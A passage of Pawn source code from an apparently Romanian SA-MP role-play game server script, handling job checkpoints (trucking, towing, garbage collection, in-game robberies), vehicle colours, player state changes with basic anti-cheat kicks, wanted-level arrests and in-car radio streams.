	    	SetPlayerCheckpoint(playerid,CHKTruck2[13][0],CHKTruck2[13][1],CHKTruck2[13][2],5.0);
		}
		else if(Trucker[playerid] == 13)
		{
		    pertransport = 20000 + random(10000);
	    	Trucker2[playerid] = 4;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[17][0],CHKTruck2[17][1],CHKTruck2[17][2],5.0);
		}
		else if(Trucker[playerid] == 14)
		{
		    pertransport = 27000 + random(10000);
	    	Trucker2[playerid] = 4;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[15][0],CHKTruck2[15][1],CHKTruck2[15][2],5.0);
		}
		else if(Trucker[playerid] == 15)
		{
		    pertransport = 27000 + random(10000);
	    	Trucker2[playerid] = 4;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[16][0],CHKTruck2[16][1],CHKTruck2[16][2],5.0);
		}
		else if(Trucker[playerid] == 16)
		{
		    pertransport = 20000 + random(10000);
	    	Trucker2[playerid] = 4;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[14][0],CHKTruck2[14][1],CHKTruck2[14][2],5.0);
		}
		else if(Trucker[playerid] == 17)
		{
		    pertransport = 37000 + random(15000);
	    	Trucker2[playerid] = 1;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[0][0],CHKTruck2[0][1],CHKTruck2[0][2],5.0);
		}
		else if(Trucker[playerid] == 18)
		{
		    pertransport = 20000 + random(10000);
	    	Trucker2[playerid] = 2;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[1][0],CHKTruck2[1][1],CHKTruck2[1][2],5.0);
		}
		skillmoney = PlayerInfo[playerid][pTruckSkill] * 3000;
		totalmoney = pertransport + skillmoney;
		PlayerInfo[playerid][pTruckRem]--;
		PlayerInfo[playerid][pTruckTimes]++;
		GivePlayerCash(playerid,totalmoney);
		Update(playerid,pCashx);
		Update(playerid,pTruckRemx);
		Update(playerid,pTruckTimesx);
		if(PlayerInfo[playerid][pTruckSkill] <= 5)
		{
			if(PlayerInfo[playerid][pTruckRem] <= 0)
			{
			    PlayerInfo[playerid][pTruckSkill]++;
   				if(PlayerInfo[playerid][pTruckSkill] == 2)
				{
					PlayerInfo[playerid][pTruckRem] = 34;
				}
				else if(PlayerInfo[playerid][pTruckSkill] == 3)
				{
					PlayerInfo[playerid][pTruckRem] = 49;
				}
				else if(PlayerInfo[playerid][pTruckSkill] == 4)
				{
					PlayerInfo[playerid][pTruckRem] = 89;
				}
				else if(PlayerInfo[playerid][pTruckSkill] == 5)
				{
					PlayerInfo[playerid][pTruckRem] = 99;
				}
		    	Update(playerid,pTruckSkillx);
		    	Update(playerid,pTruckRemx);
			    format(string,sizeof(string),"Congratulations! You now have skill %d for this job!",PlayerInfo[playerid][pTruckSkill]);
			    SendClientMessage(playerid, COLOR_YELLOW, string);
			}
		}
		Trucker[playerid] = 0;
		format(string,sizeof(string),"(+) You got $%s to deliver goods.",FormatNumber(totalmoney));
		SendClientMessage(playerid, COLOR_GREEN, string);
	}
	else if(Trucker2[playerid] == 1) //Langa Gas Station(primul)
	{
	    SetTimerEx("Truckerr1", 200, 0, "i",playerid);
	}
	else if(Trucker2[playerid] == 2)//IN LS
	{
	    SetTimerEx("Truckerr2", 200, 0, "i",playerid);
	}
	else if(Trucker2[playerid] == 3)//IN LV
	{
	    SetTimerEx("Truckerr3", 200, 0, "i",playerid);
	}
	else if(Trucker2[playerid] == 4)//IN SF
	{
	    SetTimerEx("Truckerr4", 200, 0, "i",playerid);
	}
	else if(MedicCallTime[playerid] > 0)
	{
		GameTextForPlayer(playerid, "~w~~h~Reached destination", 5000, 1);
		MedicCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else if(MechanicCallTime[playerid] > 0)
	{
		GameTextForPlayer(playerid, "~w~~h~Reached destination", 5000, 1);
		MechanicCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	new lol = GetPlayerVehicleID(playerid);
	if(CP[playerid] == 34) // tow car
	{
	    if(IsTrailerAttachedToVehicle(lol) == 0) return SCM(playerid, COLOR_SERVER, "{FFFF00}You have no trailer attached.");
	    if(TowAcc[playerid] == 1) return SendClientMessage(playerid, COLOR_GREY, "You can't tow a vehicle so fast. You can tow a car / 2 minute! Wait here.");
		DisablePlayerCheckpoint(playerid);
		CP[playerid] = 0;
		TowAcc[playerid] = 1;
		new towedcar;
		towedcar = GetVehicleTrailer(GetPlayerVehicleID(playerid));
		SetVehicleToRespawn(towedcar);
		GivePlayerCash(playerid, 15000);
		SCM(playerid,COLOR_SERVER,"Good job! You got $15000 for towing this car! You can tow another car in 2 minutes!");
		Update(playerid, pCashx);
		SetTimerEx("TowAgain", 120000, 0, "i", playerid);
	}
	else if(CP[playerid] == 43) // disable point
	{
		CP[playerid] = 0;
	    DisablePlayerCheckpoint(playerid);
		SendClientMessage(playerid, COLOR_SERVER, "You have reached your destination.");
	}
	else if(BusinessRob[playerid] == 1 && CP[playerid] == 1111222223)
	{
		DisablePlayerCheckpoint(playerid);
		RemovePlayerAttachedObject(playerid,0);
		banirob[playerid] = -1;
		RobTime[playerid] = -1;
		RobTimer[playerid] = -1;
		new rand = 100000 + random(100000) * PlayerInfo[playerid][pRobSkill];
		GivePlayerCash(playerid, rand);
		Update(playerid, pCashx);
		format(MGLOBAL, sizeof(MGLOBAL), "Congratulations! The robbery was successful. You managed to add {0066FF}$%s {FFFFFF}the bag of money.",FormatNumber(rand));
		SCM(playerid, COLOR_SERVER, MGLOBAL);
		BusinessRob[playerid] = 99;
		//PlayerInfo[playerid][pWantedLevel] = 0;
		//SetPlayerWantedLevel(playerid, 0);
		PlayerTextDrawHide(playerid, WantedText[playerid]);
		ResetPlayerWeaponsEx(playerid);
		ResetPlayerWeapons(playerid);
		WantedPoints[playerid] = 0;
		DestroyDynamic3DTextLabel(WantedScris[playerid]);
		ClearCrime(playerid);
		Update(playerid,pWantedLevelx);
		if(PlayerInfo[playerid][pRobSkill] <= 5)
		{
			PlayerInfo[playerid][pRobRem]--;
			if(PlayerInfo[playerid][pRobRem] <= 0)
			{
				PlayerInfo[playerid][pRobSkill]++;
				if(PlayerInfo[playerid][pRobSkill] == 2)
				{
					PlayerInfo[playerid][pRobRem] = 34;
				}
				else if(PlayerInfo[playerid][pRobSkill] == 3)
				{
					PlayerInfo[playerid][pRobRem] = 49;
				}
				else if(PlayerInfo[playerid][pRobSkill] == 4)
				{
					PlayerInfo[playerid][pRobRem] = 89;
				}
				else if(PlayerInfo[playerid][pRobSkill] == 5)
				{
					PlayerInfo[playerid][pRobRem] = 99;
				}
				Update(playerid,pRobSkillx);
				Update(playerid,pRobRemx);
				format(string,sizeof(string),"Congratulations! Now the skill is your plunder %d!",PlayerInfo[playerid][pRobSkill]);
				SendClientMessage(playerid, COLOR_YELLOW, string);
			}
		}
		//|----------succes jaf ----------|
		InterpolateCameraPos(playerid, 1857.718139, -2029.850708, 14.225893, 1857.259521, -2014.692749, 20.710727, 3000);
		InterpolateCameraLookAt(playerid, 1857.843017, -2034.815795, 13.649055, 1857.399169, -2019.252197, 18.663368, 3000);
		RobTimer[playerid] = 5;
		SetPlayerPos(playerid, 1856.6265,-2031.8678,13.5469);
	}
	else if(IsCollectingRubbish[playerid] > 0)//garbagejob
	{
	    if(IsAGarbageTruck(veh))
	    {
			if(IsCollectingRubbish[playerid] == 1)
			{
			    GarbageTime[playerid] += 1;
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 2006.3785,2296.4165,10.8203,4.0);
	        	IsCollectingRubbish[playerid] = 2;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~1~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 2)
			{
			    GarbageTime[playerid] += 1;
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 2208.1367,2327.6045,10.3855,4.0);
	        	IsCollectingRubbish[playerid] = 3;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~2~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 3)
			{
			    GarbageTime[playerid] += 1;//1
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 2233.1001,2156.7620,10.3858,4.0);
	        	IsCollectingRubbish[playerid] = 4;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~3~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 4)
			{
			    GarbageTime[playerid] += 1;//2
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 2188.8110,1769.0968,10.2364,4.0);
	        	IsCollectingRubbish[playerid] = 5;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~4~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 5)
			{
			    GarbageTime[playerid] += 1;//3
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 2629.8022,1681.6798,10.3865,4.0);
	        	IsCollectingRubbish[playerid] = 6;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~5~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 6)
			{
			    GarbageTime[playerid] += 1;//4
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 2183.8679,1498.5260,10.3874,4.0);
	        	IsCollectingRubbish[playerid] = 7;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~6~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 7)
			{
                GarbageTime[playerid] += 1;//5
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 1737.6616,1250.0906,10.2406,4.0);
	        	IsCollectingRubbish[playerid] = 8;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~7~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 8)
			{
			    GarbageTime[playerid] += 1;//6
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 2101.1743,2649.2373,10.3865,4.0);
	        	IsCollectingRubbish[playerid] = 9;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~8~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 9)
			{
			    GarbageTime[playerid] += 1;//7
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 2375.6013,2754.8406,10.3869,4.0);
	        	IsCollectingRubbish[playerid] = 10;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~9~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 10)
			{
   				GarbageTime[playerid] += 1;//1
				TogglePlayerControllable(playerid, 0);
	        	DisablePlayerCheckpoint(playerid);
	        	SetPlayerCheckpoint(playerid, 2523.8540,2818.3945,10.3907,4.0);
	        	IsCollectingRubbish[playerid] = 20;
	        	new str2[128];
				format(str2,sizeof(str2),"~y~garbage collected: ~r~10~y~/~r~10");
				PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
			}
			else if(IsCollectingRubbish[playerid] == 20)
	   		{
	        	DisablePlayerCheckpoint(playerid);
	        	PlayerTextDrawHide(playerid, gunoierr[playerid]);
				new randgarba = 80000 + random(100000);
				format(string,sizeof(string),"{FFFF00}You received %s$ for your work.",FormatNumber(randgarba));
				SCM(playerid,COLOR_SERVER,string);
				GivePlayerCash(playerid,randgarba);
	        	IsCollectingRubbish[playerid] = 0;
	        	PlayerInfo[playerid][pGarbageTime] = 0;
	        	Gas[veh] = GasMax;
	        	vehEngine[veh] = 0;
		    	GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
		    	SetVehicleParamsEx(veh,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
		    	SetPVarInt(playerid, "Engine", 0);
	        	SetVehicleToRespawn(veh);
				Update(playerid, pCashx);
			}
		}
	}
	else
	{
		switch (gPlayerCheckpointStatus[playerid])
		{
			case CHECKPOINT_LOCATE:
		    {
				DisablePlayerCheckpoint(playerid);
				gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
			}
		}
	}
	return 1;
}


public OnPlayerSelectedMenuRow(playerid, row)
{
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
	new Menu:CurrentMenu = GetPlayerMenu(playerid);
	if(!IsValidMenu(CurrentMenu)) return 1;
	ShowMenuForPlayer(CurrentMenu, playerid);
	TogglePlayerControllable(playerid,1);
	return 1;
}

public SetAllPlayerCheckpoint(Float:allx, Float:ally, Float:allz, Float:radi, num)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			SetPlayerCheckpoint(i,allx,ally,allz, radi);
			if (num != 255)
			{
				gPlayerCheckpointStatus[i] = num;
			}
		}
	}
	return 1;
}

public SetAllCopCheckpoint(Float:allx, Float:ally, Float:allz, Float:radi)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(gTeam[i] == 2)
			{
				SetPlayerCheckpoint(i,allx,ally,allz, radi);
			}
		}
	}
	return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
    	/*if(PlayerInfo[playerid][pCarLic] < 1)
		{
			if(IsABike(vehicleid) || IsAExamen (vehicleid)) { }
		 	else
	   	 	{
				if(TakingLesson[playerid] == 1) { }
				else
				{
			 		SendClientMessage(playerid,COLOR_GREY, "You don't have a driving license.");
    	        	ClearAnimations(playerid);
				}
		  	}
		}*/
		ChangeVehicleColor(news[1], 5, 149);
		ChangeVehicleColor(news[2], 5, 149);
		ChangeVehicleColor(news[3], 5, 149);
		ChangeVehicleColor(news[4], 5, 149);
		    ChangeVehicleColor(news[5], 5, 149);
		    ChangeVehicleColor(news[6], 5, 149);
   		    ChangeVehicleColor(news[7], 5, 149);
   		    ChangeVehicleColor(news[8], 5, 149);
   		    ChangeVehicleColor(news[9], 5, 149);
   		    ChangeVehicleColor(news[10], 5, 149);
   		    ChangeVehicleColor(news[11], 5, 149);
   		    ChangeVehicleColor(news[12], 5, 149);
   		    /////grove////
   		        ChangeVehicleColor(Grovec[1], 128, 149);
	ChangeVehicleColor(Grovec[2], 128, 149);
	ChangeVehicleColor(Grovec[3], 128, 149);
	ChangeVehicleColor(Grovec[4], 128, 149);
	ChangeVehicleColor(Grovec[5], 128, 149);
	ChangeVehicleColor(Grovec[6], 128, 149);
	ChangeVehicleColor(Grovec[7], 128, 149);
	ChangeVehicleColor(Grovec[8], 128, 149);
	ChangeVehicleColor(Grovec[9], 128, 149);
	ChangeVehicleColor(Grovec[10], 128, 149);
	ChangeVehicleColor(Grovec[11], 128, 149);
	ChangeVehicleColor(Grovec[12], 128, 149);
	ChangeVehicleColor(Grovec[13], 128, 149);
	ChangeVehicleColor(Grovec[14], 128, 149);
	ChangeVehicleColor(Grovec[15], 128, 149);
	ChangeVehicleColor(Grovec[16], 128, 149);
	ChangeVehicleColor(Grovec[17], 128, 149);
	ChangeVehicleColor(Grovec[18], 128, 149);
	ChangeVehicleColor(Grovec[19], 128, 149);
	ChangeVehicleColor(Grovec[20], 128, 149);
	/////ambs///
	ChangeVehicleColor(ambcars[1],001,003);
	ChangeVehicleColor(ambcars[2],001,003);
	ChangeVehicleColor(ambcars[3],001,003);
	ChangeVehicleColor(ambcars[4],001,003);
	ChangeVehicleColor(ambcars[5],001,003);
	ChangeVehicleColor(ambcars[6],001,003);
	ChangeVehicleColor(ambcars[7],001,003);
	ChangeVehicleColor(ambcars[8],001,003);
	ChangeVehicleColor(ambcars[9],001,003);
	ChangeVehicleColor(ambcars[10],001,003);
	ChangeVehicleColor(ambcars[11],001,003);
	ChangeVehicleColor(ambcars[12],001,003);
	ChangeVehicleColor(ambcars[13],003,001);
	ChangeVehicleColor(ambcars[14],003,001);
	ChangeVehicleColor(ambcars[15],003,001);
	ChangeVehicleColor(ambcars[16],001,003);
	ChangeVehicleColor(ambcars[17],001,003);
	ChangeVehicleColor(ambcars[18],001,003);
	ChangeVehicleColor(ambcars[19],001,003);
	p_ac[playerid]= 1;
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	new string[500],
		vehicleid = GetPlayerVehicleID(playerid);	
	if(newstate == PLAYER_STATE_DRIVER)
	{
		if((GetTickCount()-GetPVarInt(playerid, "cartime")) < 1000) // enters veh as driver faster than 1 once
		{
			SetPVarInt(playerid, "carspam", GetPVarInt(playerid, "carspam")+1);
			if(GetPVarInt(playerid, "carspam") >= 5) // allows 5 seconds leeway to compensate for glitching, then kicks
			{
				new name[24];
				GetPlayerName(playerid,name,24);
				format(string,sizeof(string),"{FF6347}Kick: %s has been kicked by AdmBot, reason: Troll Hack",name);
    			SendClientMessageToAll(COLOR_ERROR, string);
				return Kick(playerid);
			}
		}
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{ 
		if(p_ac[playerid] == 0 && Spectate[playerid] == -1) 
		{
			new name[24];
			GetPlayerName(playerid,name,24);
			format(string,sizeof(string),"{FF6347}Kick: %s has been kicked by AdmBot, reason: Vehicle Teleporter",name);
    		SendClientMessageToAll(COLOR_ERROR, string);
			return Kick(playerid);
		}	
    }
    p_ac[playerid] = 0; 
	SetPVarInt(playerid, "cartime", GetTickCount());
	if( newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_PASSENGER)
	{
	    if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
	}
	if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_DRIVER && workdeja[playerid] == 1)
    {
	    SetTimerEx("Livrarepizza1", 30000, 0, "i", playerid);
	    SCM(playerid, -1, "{990000}(!)you 60 seconds to return the scooter, otherwise it will disappear scooter.");
	}
	if(newstate == PLAYER_STATE_ONFOOT)
	{
		PlayerTextDrawHide(playerid, TDKM[playerid][0]);
		PlayerTextDrawHide(playerid, TDKM[playerid][1]);
		PlayerTextDrawHide(playerid, TDKM[playerid][2]);
		PlayerTextDrawHide(playerid, TDKM[playerid][3]);
		PlayerTextDrawHide(playerid, TDKM[playerid][4]);
		if(JCurier[playerid][0] > 0)
		{
			if(JCurier[playerid][1] > 0)
			{
				DisableRemoteVehicleCollisions(playerid, 0);
			}
			DestroyVehicle(JCurier[playerid][2]);
			JCurier[playerid][0] = -1;
			JCurier[playerid][1] = -1;
			JCurier[playerid][2] = -1;
			JCurier[playerid][3] = 0;
			SCM(playerid, COLOR_ERROR, "Job failed! You got out of vehicle.");
			DisablePlayerCheckpoint(playerid);
		}
		if(JCiment[playerid][0] > 0)
		{
			RemovePlayerAttachedObject(playerid, betonobject1[playerid]);
			DestroyPlayerObject(playerid,betonobject1[playerid]);	
			DestroyPlayerObject(playerid,betonobject2[playerid]);
			if(JCiment[playerid][1] > 0)
			{
				DisableRemoteVehicleCollisions(playerid, 0);
			}
			DestroyVehicle(JCiment[playerid][2]);
			JCiment[playerid][0] = -1;
			JCiment[playerid][1] = -1;
			JCiment[playerid][2] = -1;
			SCM(playerid, COLOR_ERROR, "Job failed! You got out of vehicle.");
			DisablePlayerCheckpoint(playerid);
		}
		if(JCariera[playerid][0] > 0)
		{
			if(JCariera[playerid][1] > 0)
			{
				DisableRemoteVehicleCollisions(playerid, 0);
			}
			DestroyVehicle(JCariera[playerid][2]);
			JCariera[playerid][0] = -1;
			JCariera[playerid][1] = -1;
			JCariera[playerid][2] = -1;
			SCM(playerid, COLOR_ERROR, "Job failed! You got out of vehicle.");
			DisablePlayerCheckpoint(playerid);
			for(new t = 0; t < 26; t++)
			{
				if( IsValidDynamicObject( CarieraObiect[playerid][t] ) )
				{
					DestroyDynamicObject(CarieraObiect[playerid][t]);
				}
			}
		}
		if(IsCollectingRubbish[playerid] > 0)
		{
		    DisablePlayerCheckpoint(playerid);
		    PlayerInfo[playerid][pGarbageTime] = 0;
		    IsCollectingRubbish[playerid] = 0;
		   	PlayerTextDrawHide(playerid, gunoierr[playerid]);
		}
		if(pizzaj[playerid] == 1)
		{
			failpizza[playerid] = 120;
		}
		if(HireCar[playerid] != -1)
		{
		    timerrent[playerid] = 900;
		}
		if(RentVeh[playerid] != -1)
		{
			VehicleRent[RentVeh[playerid]] = -1;
			RentTime[playerid] = 0;
			TotalTimeRent[playerid] = 0;
			RentVeh[playerid] = -1;
			KillTimer(RentTimerr[playerid]);
			PlayerTextDrawHide(playerid, RentCar[playerid]);
		}
		if(farmerc[playerid] == 1)
		{
			farmerc[playerid] = 0;
			farmertime[playerid] = 1;
			PlayerTextDrawHide(playerid, farmjob[playerid]);
			PlayerTextDrawHide(playerid, farmbox[playerid]);
			PlayerTextDrawHide(playerid, farmtime[playerid]);
			PlayerTextDrawHide(playerid, farmspeed[playerid]);
			PlayerTextDrawHide(playerid, farmwanted[playerid]);
			KillTimer(timerfarmm[playerid]);
		}
		if(CarJacker[playerid] > 0)
		{
		    DisablePlayerCheckpoint(playerid);
		    CarJacker[playerid] = 0;
		    JackAcc[playerid] = 0;
		}
		if(Trucker2[playerid] == 1)
		{
			Trucker2[playerid] = 0;
 			DisablePlayerCheckpoint(playerid);
		}
		if(Trucker[playerid] >= 1)
		{
		   	RemovePlayerFromVehicle(playerid);
   			restruck[playerid] = SetTimerEx("RespawnTruck", 1, 0, "i",playerid);
  			RemovePlayerFromVehicle(playerid);
		   	Trucker[playerid] = 0;
	        Trucker2[playerid] = 0;
	        DestroyVehicle(viddd[playerid]);
      		viddd[playerid] = 0;
      		SetVehicleToRespawn(TruckID[playerid]);
      		TruckID[playerid] = 0;
      		DisablePlayerCheckpoint(playerid);
    		restruck[playerid] = SetTimerEx("RespawnTruck", 1, 0, "i",playerid);
		}
		if(CP[playerid] == 340 || CP[playerid] == 341 || CP[playerid] == 342 || CP[playerid] == 343 || CP[playerid] == 344 || CP[playerid] == 345 || CP[playerid] == 346 || CP[playerid] == 347)
		{
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
		}
		if(CP[playerid] == 34)
		{
		    TowAcc[playerid] = 1;
		    CP[playerid] = 0;
		    DisablePlayerCheckpoint(playerid);
		    SetTimerEx("TowAgain", 120000, 0, "i", playerid);
		}
	    if(TransportDuty[playerid] > 0)
		{
		    if(TransportDuty[playerid] == 1)
			{
		        TaxiDrivers -= 1;
			}
			TransportDuty[playerid] = 0;
			format(string, sizeof(string), "* You are now Off Duty and earned $%d.", TransportMoney[playerid]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, TransportMoney[playerid]);
			ConsumingMoney[playerid] = 1; TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
		}
		if(TransportCost[playerid] > 0 && TransportDriver[playerid] < 999)
		{
		    if(IsPlayerConnected(TransportDriver[playerid]))
			{
			    new sendername[30],giveplayer[30];
			    GetPlayerName(playerid,sendername,sizeof(sendername));
		    	GetPlayerName(TransportDriver[playerid],giveplayer,sizeof(giveplayer));
			    TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
			    TransportTime[TransportDriver[playerid]] = 0;
			    TransportCost[TransportDriver[playerid]] = 0;
			    format(string, sizeof(string), "~w~The ride cost~n~~r~~h~$%d",TransportCost[playerid]);
			    GameTextForPlayer(playerid, string, 5000, 1);
			    format(string, sizeof(string), "~w~Passenger left the taxi~n~~g~Earned $%d",TransportCost[playerid]);
			    GameTextForPlayer(TransportDriver[playerid], string, 5000, 1);
			    PlayerInfo[TransportDriver[playerid]][pOrders] += 1;
				Update(TransportDriver[playerid],pOrdersx);
			    format(string, sizeof(string), "# %s gets off the cab and pays $%s to %s.",sendername,FormatNumber(TransportCost[playerid]),giveplayer);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				GivePlayerCash(playerid, -TransportCost[playerid]);
				TransportCost[playerid] = 0;
				TransportTime[playerid] = 0;
				TransportDriver[playerid] = 999;
				Update(playerid, pCashx);
			}
		}
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
	}
	if(newstate == PLAYER_STATE_WASTED)
	{
	    if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
	    if(PlayerInfo[playerid][pWantedLevel] >= 1)
		{
		    new copkill=0, price = PlayerInfo[playerid][pWantedLevel] * 1000, str23[MAX_STRING], totalprice = price / 2, string3[256], string4[256], lastname[30];
		    if((PlayerInfo[playerid][pMember] != 1 && PlayerInfo[playerid][pMember] != 2 && PlayerInfo[playerid][pMember] != 3 && PlayerInfo[playerid][pMember] != 8))
			{
			    for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i))
					{
					    if(IsACop(i) && CrimInRange(50.0, playerid,i) && OnDuty[i] == 1)
						{
							if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
							{
								new streap[MAX_PLAYER_NAME];
								GetPlayerName(playerid, streap, sizeof(streap));
								GetPlayerName(i, lastname, sizeof(lastname));
								format(string3, sizeof(string3), "You Got $%d bonus for catching the suspect %s.", totalprice, streap);
								SendClientMessage(i, COLOR_DBLUE, string3);
								GameTextForPlayer(i, "Running Suspect bonus!", 5000, 1);
								ConsumingMoney[i] = 1;
								GivePlayerCash(i, price);
								Update(i, pCashx);
								PlayerInfo[i][pRunners] += 1;
								Update(i,pRunnersx);
								new idfac = PlayerInfo[i][pMember];
								DynamicFactions[idfac][fBank] += totalprice;
								mysql_format(SQL,str23,sizeof(str23),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'", DynamicFactions[idfac][fBank], idfac);
								mysql_tquery(SQL,str23,"","");
								PlayerPlaySound(i, 1058, 0.0, 0.0, 0.0);
								copkill = 1;
							}
						}
					}
				}
				if(copkill == 1)
				{
					PlayerInfo[playerid][pJailTime] = (PlayerInfo[playerid][pWantedLevel])*(300);
					format(string4, sizeof(string4), "Because you got killed, you lost $%s and you will be taken to jail. You are no longer a criminal.", FormatNumber(price));
					SendClientMessage(playerid, COLOR_ERROR, string4);
					PlayerInfo[playerid][pJailed] = 1;
					PlayerInfo[playerid][pWantedLevel] = 0;
					PlayerInfo[playerid][pWantedDeaths] += 1;
					WantedPoints[playerid] = 0;
					GivePlayerCash(playerid, - price);
					new streap[30];
					GetPlayerName(playerid, streap, sizeof(streap));
					format(string3, sizeof(string3), "Dispatch: %s has been killed by No One and will be in jail for %d seconds, over.",streap,PlayerInfo[playerid][pJailTime]);
					SendTeamMessage(1, COLOR_LIGHTBLUE, string3);
					SendTeamMessage(2, COLOR_LIGHTBLUE, string3);
					SendTeamMessage(3, COLOR_LIGHTBLUE, string3);
					SendTeamMessage(8, COLOR_LIGHTBLUE, string3);
					SendTeamMessage(15, COLOR_LIGHTBLUE, string3);
					Update(playerid,pWantedLevelx);
					Update(playerid,pJailedx);
					Update(playerid,pJailTimex);
					ClearCrime(playerid);
					TogglePlayerControllable(playerid, 0);
					SetTimerEx("UnFreezeStation", 1000, false, "i", playerid);
				}
			}
		}
	}
	if(newstate == PLAYER_STATE_PASSENGER) // TAXI & BUSSES
	{
	    new name[MAX_PLAYER_NAME];
	    GetPlayerName(playerid, name, sizeof(name));
	    if(vehRadio[vehicleid] > 0)
	    {
			MP3ON[playerid] = 0;
	        if(vehRadio[vehicleid] == 1)
	    	{
	    		StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=151778");
			}
			else if(vehRadio[vehicleid] == 2)
			{
			    StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://stream.profm.ro:8012/profm.mp3");
			}
			else if(vehRadio[vehicleid] == 3)
			{
			    StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://radiotaraf.no-ip.biz:7100");
			}
			else if(vehRadio[vehicleid] == 4)
			{
			    StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://radiobandit.mine.nu:8000");
			}
			else if(vehRadio[vehicleid] == 5)
			{
			    StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://radiohotstyle.dyndns.biz:8000");
			}
			else if(vehRadio[vehicleid] == 6)
			{
			    StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://www.radiodiz.com/livediz.m3u");
			}
			else if(vehRadio[vehicleid] == 7)
			{
			    StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://necenzurat.radiotequila.ro:7000");
			}
			else if(vehRadio[vehicleid] == 8)
			{
			    StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://89.34.24.40:9994/");
			}
			else if(vehRadio[vehicleid] > 8)
			{
